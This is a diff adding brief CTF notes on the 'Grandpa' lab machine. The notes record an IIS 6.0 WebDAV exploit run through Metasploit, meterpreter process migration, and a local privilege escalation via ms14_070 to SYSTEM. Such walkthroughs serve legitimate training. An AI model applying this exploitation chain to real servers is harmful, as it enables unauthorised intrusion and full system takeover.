@@ -1,0 +1,20 @@
+Grandpa
+=============
+
+- nmap:
+   => 80/tcp open  http    Microsoft IIS httpd 6.0
+- MSF exploit/windows/iis/iis_webdav_scstoragepathfromurl
+- meterpreter> getuid
+   => failed
+- meterpreter> ps
+   => w3wp.exe (IIS) #2176 NT AUTHORITY\NETWORK SERVICE
+   => migrate 2176 (aus rundll32.exe)
+- meterpreter> getuid
+  =>  NT AUTHORITY\NETWORK SERVICE
+- meterpreter> background
+- post/multi/recon/local_exploit_suggester 
+   =>  exploit/windows/local/ms14_070_tcpip_ioctl
+- meterpreter> getuid
+  =>  NT AUTHORITY\SYSTEM
+- Desktop User Harry => user.txt
+- Desktop Administrator => root.txt
